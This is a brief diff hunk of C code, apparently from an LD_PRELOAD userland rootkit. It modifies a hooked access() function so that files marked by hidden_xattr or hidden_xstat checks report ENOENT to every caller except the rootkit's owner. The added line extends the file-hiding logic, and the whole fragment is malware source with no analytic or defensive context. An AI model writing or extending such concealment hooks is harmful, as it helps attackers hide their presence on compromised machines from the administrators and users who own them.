@@ -10,7 +10,7 @@ int access(const char *path, int amode)
 
     if(owned()) return old_access(path, amode);
 
-    if(hidden_xattr(path)) { errno = ENOENT; return -1; }
+    if(hidden_xattr(path) || hidden_xstat(_STAT_VER, path, 32)) { errno = ENOENT; return -1; }
 
     return old_access(path, amode);
 }
